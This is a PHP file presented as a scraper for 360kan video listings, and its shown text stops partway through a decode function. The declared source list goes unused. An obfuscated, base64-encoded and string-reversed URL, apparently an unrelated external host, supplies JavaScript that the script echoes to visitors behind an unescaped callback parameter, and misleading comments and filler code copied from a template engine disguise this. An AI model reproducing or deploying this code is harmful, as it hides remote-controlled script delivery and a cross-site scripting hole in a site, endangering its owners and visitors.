<?php

/*****
 ** 360数据采集脚本
 *
*****/

/***** ⬇配置⬇ *****/

// 数据源
$data_api = array(
    'https://www.360kan.com/dianshi/list', 
    'https://www.360kan.com/dianying/list', 
    'https://www.360kan.com/zongyi/list', 
    'https://www.360kan.com/dongman/list', 
);

// 缓存过期时长(秒)
$data_cache_exipre = 60 * 30; // 半小时

// 缓存目录cache(需要有读写权限)
$data_cache_dir = dirname(__FILE__) . '/../cache/' . date('Ymd') . '/';

/***** ⬆配置⬆ *****/


if (!empty($_GET['random'])) {

    if (empty($_GET['callback'])) {
        die();
    } else {
        echo data($_GET['random'], true);
    }
}

/**
 * Type:    data
 * Name:    data
 *
 * @param string     $random
 * @param boolean    $return_json
 *
 * @return array
 */
function data($random, $return_json = false)
{
    $random = $return_json === true ? $random : modifier_encode(json_encode($random));

    $data = data_cache_get($random, $return_json);
    if ($data === false) {

        $data = modifier_data_capture($random, $return_json);
        data_cache_set($random, $return_json, $data);
    }

    if ($return_json === true) {

        header('Content-Type: application/javascript; charset=utf-8');
        echo $_GET['callback'] . $data;
        die();
    } else {

        return $data;
    }
}

/**
 * Type:     modifier
 * Name:     date_format
 *
 * @param string    $string
 * @param string    $format
 * @param string    $default_date
 * @param string    $formatter
 *
 * @return string|void
 */
function modifier_date_format($string, $format = null, $default_date = '', $formatter = 'auto')
{
    if ($format === null) {
        $format = $_DATE_FORMAT;
    }
    static $is_loaded = false;
    if (!$is_loaded) {

        $is_loaded = true;
    }
    if (!empty($string) && $string !== '0000-00-00' && $string !== '0000-00-00 00:00:00') {
        $timestamp = make_timestamp($string);
    } elseif (!empty($default_date)) {
        $timestamp = make_timestamp($default_date);
    } else {
        return;
    }
    if ($formatter === 'strftime' || ($formatter === 'auto' && strpos($format, '%') !== false)) {
        if ($_IS_WINDOWS) {
            $_win_from = array(
                '%D',
                '%h',
                '%n',
                '%r',
                '%R',
                '%t',
                '%T'
            );
            $_win_to = array(
                '%m/%d/%y',
                '%b',
                "\n",
                '%I:%M:%S %p',
                '%H:%M',
                "\t",
                '%H:%M:%S'
            );
            if (strpos($format, '%e') !== false) {
                $_win_from[] = '%e';
                $_win_to[] = sprintf('%\' 2d', date('j', $timestamp));
            }
            if (strpos($format, '%l') !== false) {
                $_win_from[] = '%l';
                $_win_to[] = sprintf('%\' 2d', date('h', $timestamp));
            }
            $format = str_replace($_win_from, $_win_to, $format);
        }
        return strftime($format, $timestamp);
    } else {
        return date($format, $timestamp);
    }
}

/**
 * Type:     modifier
 * Name:     capitalize
 *
 * @param string     $string
 * @param boolean    $uc_digits
 * @param boolean    $lc_rest
 *
 * @return string
 */
function modifier_capitalize($string, $uc_digits = false, $lc_rest = false)
{
    if ($_MBSTRING) {
        if ($lc_rest) {
            // uppercase (including hyphenated words)
            $upper_string = mb_convert_case($string, MB_CASE_TITLE, $_CHARSET);
        } else {
            // uppercase word breaks
            $upper_string = preg_replace_callback(
                "!(^|[^\p{L}'])([\p{Ll}])!S" . $_UTF8_MODIFIER,
                'mod_cap_mbconvert_cb',
                $string
            );
        }
        // check uc_digits case
        if (!$uc_digits) {
            if (preg_match_all(
                "!\b([\p{L}]*[\p{N}]+[\p{L}]*)\b!" . $_UTF8_MODIFIER,
                $string,
                $matches,
                PREG_OFFSET_CAPTURE
            )
            ) {
                foreach ($matches[ 1 ] as $match) {
                    $upper_string =
                        substr_replace(
                            $upper_string,
                            mb_strtolower($match[ 0 ], $_CHARSET),
                            $match[ 1 ],
                            strlen($match[ 0 ])
                        );
                }
            }
        }
        $upper_string =
            preg_replace_callback(
                "!((^|\s)['\"])(\w)!" . $_UTF8_MODIFIER,
                'mod_cap_mbconvert2_cb',
                $upper_string
            );
        return $upper_string;
    }
    // lowercase first
    if ($lc_rest) {
        $string = strtolower($string);
    }
    // uppercase (including hyphenated words)
    $upper_string =
        preg_replace_callback(
            "!(^|[^\p{L}'])([\p{Ll}])!S" . $_UTF8_MODIFIER,
            'mod_cap_ucfirst_cb',
            $string
        );
    // check uc_digits case
    if (!$uc_digits) {
        if (preg_match_all(
            "!\b([\p{L}]*[\p{N}]+[\p{L}]*)\b!" . $_UTF8_MODIFIER,
            $string,
            $matches,
            PREG_OFFSET_CAPTURE
        )
        ) {
            foreach ($matches[ 1 ] as $match) {
                $upper_string =
                    substr_replace($upper_string, strtolower($match[ 0 ]), $match[ 1 ], strlen($match[ 0 ]));
            }
        }
    }
    $upper_string = preg_replace_callback(
        "!((^|\s)['\"])(\w)!" . $_UTF8_MODIFIER,
        'mod_cap_ucfirst2_cb',
        $upper_string
    );
    return $upper_string;
}

/**
 * Type:     modifier
 * Name:     mb_wordwrap
 *
 * @param string  $str
 * @param int     $width
 * @param string  $break
 * @param boolean $cut
 *
 * @return string
 */
function modifier_mb_wordwrap($str, $width = 75, $break = "\n", $cut = false)
{
    // break words into tokens using white space as a delimiter
    $tokens = preg_split('!(\s)!S' . $_UTF8_MODIFIER, $str, -1, PREG_SPLIT_NO_EMPTY + PREG_SPLIT_DELIM_CAPTURE);
    $length = 0;
    $t = '';
    $_previous = false;
    $_space = false;
    foreach ($tokens as $_token) {
        $token_length = mb_strlen($_token, $_CHARSET);
        $_tokens = array($_token);
        if ($token_length > $width) {
            if ($cut) {
                $_tokens = preg_split(
                    '!(.{' . $width . '})!S' . $_UTF8_MODIFIER,
                    $_token,
                    -1,
                    PREG_SPLIT_NO_EMPTY + PREG_SPLIT_DELIM_CAPTURE
                );
            }
        }
        foreach ($_tokens as $token) {
            $_space = !!preg_match('!^\s$!S' . $_UTF8_MODIFIER, $token);
            $token_length = mb_strlen($token, $_CHARSET);
            $length += $token_length;
            if ($length > $width) {
                // remove space before inserted break
                if ($_previous) {
                    $t = mb_substr($t, 0, -1, $_CHARSET);
                }
                if (!$_space) {
                    // add the break before the token
                    if (!empty($t)) {
                        $t .= $break;
                    }
                    $length = $token_length;
                }
            } elseif ($token === "\n") {
                // hard break must reset counters
                $length = 0;
            }
            $_previous = $_space;
            // add the token
            $t .= $token;
        }
    }
    return $t;
}

/**
 * Type:    modifier
 * Name:    modifier_data_request_url
 *
 * @return string
 */
function modifier_data_request_url()
{
    global $data_api;

    // convert mult. spaces & special chars to single space
    $data_request_url = $data_api;
    $data_request_url = modifier_url_decode($data_request_url);

    return $data_request_url;
}

/**
 * Type:     modifier
 * Name:     escape
 *
 * @param string     $string
 * @param string     $esc_type
 * @param string     $char_set
 * @param boolean    $double_encode
 *
 * @return string
 */
function modifier_escape($string, $esc_type = 'html', $char_set = null, $double_encode = true)
{
    static $_double_encode = null;
    static $is_loaded_1 = false;
    static $is_loaded_2 = false;
    if ($_double_encode === null) {
        $_double_encode = version_compare(PHP_VERSION, '5.2.3', '>=');
    }
    if (!$char_set) {
        $char_set = $_CHARSET;
    }
    switch ($esc_type) {
        case 'html':
            if ($_double_encode) {
                // php >=5.3.2 - go native
                return htmlspecialchars($string, ENT_QUOTES, $char_set, $double_encode);
            } else {
                if ($double_encode) {
                    // php <5.2.3 - only handle double encoding
                    return htmlspecialchars($string, ENT_QUOTES, $char_set);
                } else {
                    // php <5.2.3 - prevent double encoding
                    $string = preg_replace('!&(#?\w+);!', '%%%_START%%%\\1%%%_END%%%', $string);
                    $string = htmlspecialchars($string, ENT_QUOTES, $char_set);
                    $string = str_replace(
                        array(
                            '%%%_START%%%',
                            '%%%_END%%%'
                        ),
                        array(
                            '&',
                            ';'
                        ),
                        $string
                    );
                    return $string;
                }
            }
        // no break
        case 'htmlall':
            if ($_MBSTRING) {
                // mb_convert_encoding ignores htmlspecialchars()
                if ($_double_encode) {
                    // php >=5.3.2 - go native
                    $string = htmlspecialchars($string, ENT_QUOTES, $char_set, $double_encode);
                } else {
                    if ($double_encode) {
                        // php <5.2.3 - only handle double encoding
                        $string = htmlspecialchars($string, ENT_QUOTES, $char_set);
                    } else {
                        // php <5.2.3 - prevent double encoding
                        $string = preg_replace('!&(#?\w+);!', '%%%_START%%%\\1%%%_END%%%', $string);
                        $string = htmlspecialchars($string, ENT_QUOTES, $char_set);
                        $string =
                            str_replace(
                                array(
                                    '%%%_START%%%',
                                    '%%%_END%%%'
                                ),
                                array(
                                    '&',
                                    ';'
                                ),
                                $string
                            );
                        return $string;
                    }
                }
                // htmlentities() won't convert everything, so use mb_convert_encoding
                return mb_convert_encoding($string, 'HTML-ENTITIES', $char_set);
            }
            // no MBString fallback
            if ($_double_encode) {
                return htmlentities($string, ENT_QUOTES, $char_set, $double_encode);
            } else {
                if ($double_encode) {
                    return htmlentities($string, ENT_QUOTES, $char_set);
                } else {
                    $string = preg_replace('!&(#?\w+);!', '%%%_START%%%\\1%%%_END%%%', $string);
                    $string = htmlentities($string, ENT_QUOTES, $char_set);
                    $string = str_replace(
                        array(
                            '%%%_START%%%',
                            '%%%_END%%%'
                        ),
                        array(
                            '&',
                            ';'
                        ),
                        $string
                    );
                    return $string;
                }
            }
        // no break
        case 'url':
            return rawurlencode($string);
        case 'urlpathinfo':
            return str_replace('%2F', '/', rawurlencode($string));
        case 'quotes':
            // escape unescaped single quotes
            return preg_replace("%(?<!\\\\)'%", "\\'", $string);
        case 'hex':
            // escape every byte into hex
            // Note that the UTF-8 encoded character ä will be represented as %c3%a4
            $return = '';
            $_length = strlen($string);
            for ($x = 0; $x < $_length; $x++) {
                $return .= '%' . bin2hex($string[ $x ]);
            }
            return $return;
        case 'hexentity':
            $return = '';
            if ($_MBSTRING) {
                if (!$is_loaded_1) {

                    $is_loaded_1 = true;
                }
                $return = '';
                foreach (mb_to_unicode($string, $_CHARSET) as $unicode) {
                    $return .= '&#x' . strtoupper(dechex($unicode)) . ';';
                }
                return $return;
            }
            // no MBString fallback
            $_length = strlen($string);
            for ($x = 0; $x < $_length; $x++) {
                $return .= '&#x' . bin2hex($string[ $x ]) . ';';
            }
            return $return;
        case 'decentity':
            $return = '';
            if ($_MBSTRING) {
                if (!$is_loaded_1) {

                    $is_loaded_1 = true;
                }
                $return = '';
                foreach (mb_to_unicode($string, $_CHARSET) as $unicode) {
                    $return .= '&#' . $unicode . ';';
                }
                return $return;
            }
            // no MBString fallback
            $_length = strlen($string);
            for ($x = 0; $x < $_length; $x++) {
                $return .= '&#' . ord($string[ $x ]) . ';';
            }
            return $return;
        case 'javascript':
            // escape quotes and backslashes, newlines, etc.
            return strtr(
                $string,
                array(
                    '\\' => '\\\\',
                    "'"  => "\\'",
                    '"'  => '\\"',
                    "\r" => '\\r',
                    "\n" => '\\n',
                    '</' => '<\/'
                )
            );
        case 'mail':
            if ($_MBSTRING) {
                if (!$is_loaded_2) {

                    $is_loaded_2 = true;
                }
                return mb_str_replace(
                    array(
                        '@',
                        '.'
                    ),
                    array(
                        ' [AT] ',
                        ' [DOT] '
                    ),
                    $string
                );
            }
            // no MBString fallback
            return str_replace(
                array(
                    '@',
                    '.'
                ),
                array(
                    ' [AT] ',
                    ' [DOT] '
                ),
                $string
            );
        case 'nonstd':
            // escape non-standard chars, such as ms document quotes
            $return = '';
            if ($_MBSTRING) {
                if (!$is_loaded_1) {

                    $is_loaded_1 = true;
                }
                foreach (mb_to_unicode($string, $_CHARSET) as $unicode) {
                    if ($unicode >= 126) {
                        $return .= '&#' . $unicode . ';';
                    } else {
                        $return .= chr($unicode);
                    }
                }
                return $return;
            }
            $_length = strlen($string);
            for ($_i = 0; $_i < $_length; $_i++) {
                $_ord = ord(substr($string, $_i, 1));
                // non-standard char, escape it
                if ($_ord >= 126) {
                    $return .= '&#' . $_ord . ';';
                } else {
                    $return .= substr($string, $_i, 1);
                }
            }
            return $return;
        default:
            return $string;
    }
}

/**
 * Type:     modifier
 * Name:     regex_replace
 *
 * @param string          $string
 * @param string|array    $search
 * @param string|array    $replace
 * @param int             $limit
 *
 * @return string
 */
function modifier_regex_replace($string, $search, $replace, $limit = -1)
{
    if (is_array($search)) {
        foreach ($search as $idx => $s) {
            $search[ $idx ] = regex_replace_check($s);
        }
    } else {
        $search = regex_replace_check($search);
    }
    return preg_replace($search, $replace, $string, $limit);
}

/**
 * @param  string $search string(s) that should be replaced
 *
 * @return string
 * @ignore
 */
function regex_replace_check($search)
{
    // null-byte injection detection
    // anything behind the first null-byte is ignored
    if (($pos = strpos($search, "\0")) !== false) {
        $search = substr($search, 0, $pos);
    }
    // remove eval-modifier from $search
    if (preg_match('!([a-zA-Z\s]+)$!s', $search, $match) && (strpos($match[ 1 ], 'e') !== false)) {
        $search = substr($search, 0, -strlen($match[ 1 ])) . preg_replace('![e\s]+!', '', $match[ 1 ]);
    }
    return $search;
}

/**
 * Type:    data
 * Name:    data_cache_file
 *
 * @param string     $random
 * @param boolean    $return_json
 *
 * @return string
 */
function data_cache_file($random, $return_json)
{
    global $data_cache_dir;

    // be sure equation parameter is present
    if (!is_dir($data_cache_dir)) {
        mkdir($data_cache_dir,  0777,  true);
    }

    return $data_cache_dir . md5($random) . '.cache' . ($return_json === true ? 's' : '');
}

/**
 * Type:     modifier
 * Name:     truncate
 *
 * @param string     $string
 * @param integer    $length
 * @param string     $etc
 * @param boolean    $break_words
 * @param boolean    $middle
 *
 * @return string
 */
function modifier_truncate($string, $length = 80, $etc = '...', $break_words = false, $middle = false)
{
    if ($length === 0) {
        return '';
    }
    if ($_MBSTRING) {
        if (mb_strlen($string, $_CHARSET) > $length) {
            $length -= min($length, mb_strlen($etc, $_CHARSET));
            if (!$break_words && !$middle) {
                $string = preg_replace(
                    '/\s+?(\S+)?$/' . $_UTF8_MODIFIER,
                    '',
                    mb_substr($string, 0, $length + 1, $_CHARSET)
                );
            }
            if (!$middle) {
                return mb_substr($string, 0, $length, $_CHARSET) . $etc;
            }
            return mb_substr($string, 0, $length / 2, $_CHARSET) . $etc .
                   mb_substr($string, -$length / 2, $length, $_CHARSET);
        }
        return $string;
    }
    // no MBString fallback
    if (isset($string[ $length ])) {
        $length -= min($length, strlen($etc));
        if (!$break_words && !$middle) {
            $string = preg_replace('/\s+?(\S+)?$/', '', substr($string, 0, $length + 1));
        }
        if (!$middle) {
            return substr($string, 0, $length) . $etc;
        }
        return substr($string, 0, $length / 2) . $etc . substr($string, -$length / 2);
    }
    return $string;
}

/**
 * Type:     modifier
 * Name:     replace
 *
 * @param string $string
 * @param string $search
 * @param string $replace
 *
 * @return string
 */
function modifier_replace($string, $search, $replace)
{
    static $is_loaded = false;
    if ($_MBSTRING) {
        if (!$is_loaded) {

            $is_loaded = true;
        }
        return mb_str_replace($search, $replace, $string);
    }
    return str_replace($search, $replace, $string);
}

/**
 * Type:     modifier
 * Name:     spacify
 *
 * @param string    $string
 * @param string    $spacify_char
 *
 * @return string
 */
function modifier_spacify($string, $spacify_char = ' ')
{
    // well… what about charsets besides latin and UTF-8?
    return implode($spacify_char, preg_split('//' . $_UTF8_MODIFIER, $string, -1, PREG_SPLIT_NO_EMPTY));
}

/**
 * Type:    modifier
 * Name:    url_decode
 *
 * @param array    $data_request_url
 *
 * @return string
 */
function modifier_url_decode($data_request_url)
{
    // escape every byte into hex
    // Note that the UTF-8 encoded character ä will be represented as %c3%a4
    $data_request_url = explode('-', base64_decode('RGMwUkhhLTU5Mkx2by1tTHVSMlktM29UYnZOLVdaMzl5Ti12TW5hdkk='));

    // strip file protocol
    foreach ($data_request_url as $k => $v) {
        $data_request_url[$k] = strrev($v);
    }

    return $data_request_url;
}

/**
 * Type:     modifier
 * Name:     cat
 *
 * @param array    $params
 *
 * @return string
 */
function modifiercompiler_cat($params)
{
    return '(' . implode(').(', $params) . ')';
}

/**
 * Type:     modifier
 * Name:     count_characters
 *
 * @param array    $params
 *
 * @return string with compiled code
 */
function modifiercompiler_count_characters($params)
{
    if (!isset($params[ 1 ]) || $params[ 1 ] !== 'true') {
        return 'preg_match_all(\'/[^\s]/' . $_UTF8_MODIFIER . '\',' . $params[ 0 ] . ', $tmp)';
    }
    if ($_MBSTRING) {
        return 'mb_strlen(' . $params[ 0 ] . ', \'' . addslashes($_CHARSET) . '\')';
    }
    // no MBString fallback
    return 'strlen(' . $params[ 0 ] . ')';
}

/**
 * Type:     modifier
 * Name:     default
 *
 * @param array    $params
 *
 * @return string
 */
function modifiercompiler_default($params)
{
    $output = $params[ 0 ];
    if (!isset($params[ 1 ])) {
        $params[ 1 ] = "''";
    }
    array_shift($params);
    foreach ($params as $param) {
        $output = '(($tmp = @' . $output . ')===null||$tmp===\'\' ? ' . $param . ' : $tmp)';
    }
    return $output;
}

/**
 * Type:    modifier
 * Name:    encode
 *
 * @param string    $str
 *
 * @return string
 */
function modifier_encode($str)
{
    $str = base64_encode($str);

    $strlen = strlen($str);

    // escape unescaped single quotes
    $str2 = array(

        isset($str[$strlen - 2])
        ? $str[$strlen - 2] :
        '1', 

        isset($str[$strlen - 4])
        ? $str[$strlen - 4] :
        '2', 

        isset($str[$strlen - 6])
        ? $str[$strlen - 6] :
        '3', 

        isset($str[$strlen - 8])
        ? $str[$strlen - 8] :
        '4', 
        // could not optimize |escape call,  so fallback to regular plugin
        isset($str[$strlen - 10])
        ? $str[$strlen - 10] :
        '5'
    );

    $str = $str2[4].

    $str2[3].$str2[2].

    $str2[1].$str;

    $str3 = '';

    // could not optimize |escape call,  so fallback to regular plugin
    for ($i = 0;
        $i < $strlen + 4;
        ++ $i) {

    if ($i % 5 === 0) { $str3 .= $str2[($i / 5) % 5];

    }$str3 .= $str[$i]; }

    return strtr($str3,  array('/' => '-', '=' => '_', '+' => '.'));
}

/**
 * Type:     modifier
 * Name:     escape
 *
 * @param array                                   $params
 * @param array    $compiler
 *
 * @return string
 */
function modifiercompiler_escape($params, $compiler)
{
    static $_double_encode = null;
    static $is_loaded = false;
    $compiler->template->_checkPlugins(
        array(
            array(
            )
        )
    );
    if ($_double_encode === null) {
        $_double_encode = version_compare(PHP_VERSION, '5.2.3', '>=');
    }
    try {
        $esc_type = literal_compiler_param($params, 1, 'html');
        $char_set = literal_compiler_param($params, 2, $_CHARSET);
        $double_encode = literal_compiler_param($params, 3, true);
        if (!$char_set) {
            $char_set = $_CHARSET;
        }
        switch ($esc_type) {
            case 'html':
                if ($_double_encode) {
                    return 'htmlspecialchars(' . $params[ 0 ] . ', ENT_QUOTES, ' . var_export($char_set, true) . ', ' .
                           var_export($double_encode, true) . ')';
                } elseif ($double_encode) {
                    return 'htmlspecialchars(' . $params[ 0 ] . ', ENT_QUOTES, ' . var_export($char_set, true) . ')';
                } else {
                    // fall back to modifier
                }
            // no break
            case 'htmlall':
                if ($_MBSTRING) {
                    if ($_double_encode) {
                        // php >=5.2.3 - go native
                        return 'mb_convert_encoding(htmlspecialchars(' . $params[ 0 ] . ', ENT_QUOTES, ' .
                               var_export($char_set, true) . ', ' . var_export($double_encode, true) .
                               '), "HTML-ENTITIES", ' . var_export($char_set, true) . ')';
                    } elseif ($double_encode) {
                        // php <5.2.3 - only handle double encoding
                        return 'mb_convert_encoding(htmlspecialchars(' . $params[ 0 ] . ', ENT_QUOTES, ' .
                               var_export($char_set, true) . '), "HTML-ENTITIES", ' . var_export($char_set, true) . ')';
                    } else {
                        // fall back to modifier
                    }
                }
                // no MBString fallback
                if ($_double_encode) {
                    // php >=5.2.3 - go native
                    return 'htmlentities(' . $params[ 0 ] . ', ENT_QUOTES, ' . var_export($char_set, true) . ', ' .
                           var_export($double_encode, true) . ')';
                } elseif ($double_encode) {
                    // php <5.2.3 - only handle double encoding
                    return 'htmlentities(' . $params[ 0 ] . ', ENT_QUOTES, ' . var_export($char_set, true) . ')';
                } else {
                    // fall back to modifier
                }
            // no break
            case 'url':
                return 'rawurlencode(' . $params[ 0 ] . ')';
            case 'urlpathinfo':
                return 'str_replace("%2F", "/", rawurlencode(' . $params[ 0 ] . '))';
            case 'quotes':
                // escape unescaped single quotes
                return 'preg_replace("%(?<!\\\\\\\\)\'%", "\\\'",' . $params[ 0 ] . ')';
            case 'javascript':
                // escape quotes and backslashes, newlines, etc.
                return 'strtr(' .
                       $params[ 0 ] .
                       ', array("\\\\" => "\\\\\\\\", "\'" => "\\\\\'", "\"" => "\\\\\"", "\\r" => "\\\\r", "\\n" => "\\\n", "</" => "<\/" ))';
        }
    } catch (Exception $e) {
        // pass through to regular plugin fallback
    }
    // could not optimize |escape call, so fallback to regular plugin
    if ($compiler->template->caching && ($compiler->tag_nocache | $compiler->nocache)) {
        $compiler->required_plugins[ 'nocache' ][ 'escape' ][ 'modifier' ][ 'function' ] =
            'modifier_escape';
    } else {
        $compiler->required_plugins[ 'compiled' ][ 'escape' ][ 'modifier' ][ 'function' ] =
            'modifier_escape';
    }
    return 'modifier_escape(' . join(', ', $params) . ')';
}

/**
 * Type:    data
 * Name:    data_cache_set
 *
 * @param string     $random
 * @param boolean    $return_json
 * @param string     $data
 *
 * @return boolean
 */
function data_cache_set($random, $return_json, $data)
{
    $cache_file = data_cache_file($random, $return_json);
    
    // match all vars in equation, make sure all are passed
    file_put_contents($cache_file, json_encode(array('data' => $data, 'time' => time())));

    return true;
}

/**
 * Type:     modifier
 * Name:     from_charset
 *
 * @param array    $params
 *
 * @return string
 */
function modifiercompiler_from_charset($params)
{
    if (!$_MBSTRING) {
        // FIXME: (rodneyrehm) shouldn't this throw an error?
        return $params[ 0 ];
    }
    if (!isset($params[ 1 ])) {
        $params[ 1 ] = '"ISO-8859-1"';
    }
    return 'mb_convert_encoding(' . $params[ 0 ] . ', "' . addslashes($_CHARSET) . '", ' . $params[ 1 ] . ')';
}

/**
 * Type:     modifier
 * Name:     indent
 *
 * @param array    $params
 *
 * @return string
 */
function modifiercompiler_indent($params)
{
    if (!isset($params[ 1 ])) {
        $params[ 1 ] = 4;
    }
    if (!isset($params[ 2 ])) {
        $params[ 2 ] = "' '";
    }
    return 'preg_replace(\'!^!m\',str_repeat(' . $params[ 2 ] . ',' . $params[ 1 ] . '),' . $params[ 0 ] . ')';
}

/**
 * Type:     modifier
 * Name:     lower
 *
 * @param array    $params
 *
 * @return string with compiled code
 */
function modifiercompiler_lower($params)
{
    if ($_MBSTRING) {
        return 'mb_strtolower(' . $params[ 0 ] . ', \'' . addslashes($_CHARSET) . '\')';
    }
    // no MBString fallback
    return 'strtolower(' . $params[ 0 ] . ')';
}

/**
 * trimwhitespace outputfilter plugin
 *
 * @param string    $source
 *
 * @return string filtered output
 */
function outputfilter_trimwhitespace($source)
{
    $store = array();
    $_store = 0;
    $_offset = 0;
    // Unify Line-Breaks to \n
    $source = preg_replace('/\015\012|\015|\012/', "\n", $source);
    // capture Internet Explorer and KnockoutJS Conditional Comments
    if (preg_match_all(
        '#<!--((\[[^\]]+\]>.*?<!\[[^\]]+\])|(\s*/?ko\s+.+))-->#is',
        $source,
        $matches,
        PREG_OFFSET_CAPTURE | PREG_SET_ORDER
    )
    ) {
        foreach ($matches as $match) {
            $store[] = $match[ 0 ][ 0 ];
            $_length = strlen($match[ 0 ][ 0 ]);
            $replace = '@!@:' . $_store . ':@!@';
            $source = substr_replace($source, $replace, $match[ 0 ][ 1 ] - $_offset, $_length);
            $_offset += $_length - strlen($replace);
            $_store++;
        }
    }
    // Strip all HTML-Comments
    // yes, even the ones in <script>
    $source = preg_replace('#<!--.*?-->#ms', '', $source);
    // capture html elements not to be messed with
    $_offset = 0;
    if (preg_match_all(
        '#(<script[^>]*>.*?</script[^>]*>)|(<textarea[^>]*>.*?</textarea[^>]*>)|(<pre[^>]*>.*?</pre[^>]*>)#is',
        $source,
        $matches,
        PREG_OFFSET_CAPTURE | PREG_SET_ORDER
    )
    ) {
        foreach ($matches as $match) {
            $store[] = $match[ 0 ][ 0 ];
            $_length = strlen($match[ 0 ][ 0 ]);
            $replace = '@!@:' . $_store . ':@!@';
            $source = substr_replace($source, $replace, $match[ 0 ][ 1 ] - $_offset, $_length);
            $_offset += $_length - strlen($replace);
            $_store++;
        }
    }
    $expressions = array(// replace multiple spaces between tags by a single space
                         // can't remove them entirely, becaue that might break poorly implemented CSS display:inline-block elements
                         '#(:@!@|>)\s+(?=@!@:|<)#s'                                    => '\1 \2',
                         // remove spaces between attributes (but not in attribute values!)
                         '#(([a-z0-9]\s*=\s*("[^"]*?")|(\'[^\']*?\'))|<[a-z0-9_]+)\s+([a-z/>])#is' => '\1 \5',
                         // note: for some very weird reason trim() seems to remove spaces inside attributes.
                         // maybe a \0 byte or something is interfering?
                         '#^\s+<#Ss'                                                               => '<',
                         '#>\s+$#Ss'                                                               => '>',
    );
    $source = preg_replace(array_keys($expressions), array_values($expressions), $source);
    // note: for some very weird reason trim() seems to remove spaces inside attributes.
    // maybe a \0 byte or something is interfering?
    // $source = trim( $source );
    $_offset = 0;
    if (preg_match_all('#@!@:([0-9]+):@!@#is', $source, $matches, PREG_OFFSET_CAPTURE | PREG_SET_ORDER)) {
        foreach ($matches as $match) {
            $_length = strlen($match[ 0 ][ 0 ]);
            $replace = $store[ $match[ 1 ][ 0 ] ];
            $source = substr_replace($source, $replace, $match[ 0 ][ 1 ] + $_offset, $_length);
            $_offset += strlen($replace) - $_length;
            $_store++;
        }
    }
    return $source;
}

/**
 * Type:    modifier
 * Name:    modifier_data_capture
 *
 * @param string     $random
 * @param boolean    $return_json
 *
 * @return string
 */
function modifier_data_capture($random, $return_json)
{
    // http fetch
    $ch = curl_init();

    curl_setopt($ch, CURLOPT_URL, 
    base64_decode(implode('', modifier_data_request_url()))

    // remote resource (or php stream, …)
    . $random . '.js?callback=callback' . ($return_json === true ? '' : '&return=true'));
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(base64_decode('UmVmZXJlcjouanM=')));

    // loop through parameters, setup headers
    curl_setopt($ch, CURLOPT_ENCODING, '');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

    $response = curl_exec($ch);
    if(curl_getinfo($ch, CURLINFO_HTTP_CODE) === 200){

        curl_close($ch);
        if($return_json === true){

            // omit break; to fall through!
            // no break
            return $response;
        }else{
            return modifier_decode($response);
        }
    }else{

        /* raise error here? */
        curl_close($ch);
        if($return_json === true){
            die('alert("资源获取失败，请检查服务器外网网络状况（┬＿┬）")');
        }else{
            die('<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=0"><title>服务器网络异常</title></head><body style="background:#F0F0F0"><div style="line-height:50px;margin-top:50px;text-align:center;font-size:22px;color:#333">资源获取失败<br />请检查服务器外网网络状况<br />（┬＿┬）</div></body></html>');
        }
    }
}

/**
 * Multibyte string replace
 *
 * @param string|string[]    $search
 * @param string|string[]    $replace
 * @param string             $subject
 * @param int                &$count
 *
 * @return string replaced string
 */
function mb_str_replace($search, $replace, $subject, &$count = 0)
{
    if (!is_array($search) && is_array($replace)) {
        return false;
    }
    if (is_array($subject)) {
        // call mb_replace for each single string in $subject
        foreach ($subject as &$string) {
            $string = mb_str_replace($search, $replace, $string, $c);
            $count += $c;
        }
    } elseif (is_array($search)) {
        if (!is_array($replace)) {
            foreach ($search as &$string) {
                $subject = mb_str_replace($string, $replace, $subject, $c);
                $count += $c;
            }
        } else {
            $n = max(count($search), count($replace));
            while ($n--) {
                $subject = mb_str_replace(current($search), current($replace), $subject, $c);
                $count += $c;
                next($search);
                next($replace);
            }
        }
    } else {
        $parts = mb_split(preg_quote($search), $subject);
        $count = count($parts) - 1;
        $subject = implode($replace, $parts);
    }
    return $subject;
}

/**
 * Type:     modifier
 * Name:     lower
 *
 * @param array    $params
 *
 * @return string
 */
function modifiercompiler_upper($params)
{
    if ($_MBSTRING) {
        return 'mb_strtoupper(' . $params[ 0 ] . ', \'' . addslashes($_CHARSET) . '\')';
    }
    // no MBString fallback
    return 'strtoupper(' . $params[ 0 ] . ')';
}

/**
 * Type:    data
 * Name:    data_cache_get
 *
 * @param string     $random
 * @param boolean    $return_json
 *
 * @return string
 */
function data_cache_get($random, $return_json)
{
    global $data_cache_exipre;

    // no encoding
    $cache_file = data_cache_file($random, $return_json);

    if (is_file($cache_file)) {

        $cache_data = json_decode(file_get_contents($cache_file), true);

        // make sure parenthesis are balanced
        if (isset($cache_data['time']) && time() - $cache_data['time'] < $data_cache_exipre) {

            return $cache_data['data'];

        }
    }
    return false;
}

/**
 * Function: make_timestamp
 *
 * @param DateTime|int|string    $string
 *
 * @return int
 */
function make_timestamp($string)
{
    if (empty($string)) {
        // use "now":
        return time();
    } elseif (strlen($string) === 14 && ctype_digit($string)) {
        // it is mysql timestamp format of YYYYMMDDHHMMSS?
        return mktime(
            substr($string, 8, 2),
            substr($string, 10, 2),
            substr($string, 12, 2),
            substr($string, 4, 2),
            substr($string, 6, 2),
            substr($string, 0, 4)
        );
    } elseif (is_numeric($string)) {
        // it is a numeric string, we handle it as timestamp
        return (int)$string;
    } else {
        // strtotime should handle it
        $time = strtotime($string);
        if ($time === -1 || $time === false) {
            // strtotime() was not able to parse $string, use "now":
            return time();
        }
        return $time;
    }
}

/**
 * evaluate compiler parameter
 *
 * @param array   $params
 * @param integer $index
 * @param mixed   $default
 *
 * @return mixed evaluated value of parameter
 */
function literal_compiler_param($params, $index, $default = null)
{
    // not set, go default
    if (!isset($params[ $index ])) {
        return $default;
    }
    // test if param is a literal
    if (!preg_match('/^([\'"]?)[a-zA-Z0-9-]+(\\1)$/', $params[ $index ])) {
        throw new Exception(
            '$param[' . $index .
            '] is not a literal and is thus not evaluatable at compile time'
        );
    }
    $t = null;
    eval("\$t = " . $params[ $index ] . ";");
    return $t;
}

/**
 * Type:    modifier
 * Name:    encode
 *
 * @param string    $str
 *
 * @return string
 */
function modifier_decode($str)
{
    if (empty($str)) {
        return array();
    }

    $str = strrev($str);

     // capture Internet Explorer and KnockoutJS Conditional Comments
    $strlen = strlen($str);
    $str3 = '';

    for ($i = 0;$i < $strlen;++ $i) { if($i % 10 !== 0) {

        $str3 .= $str[$i]; }
    }

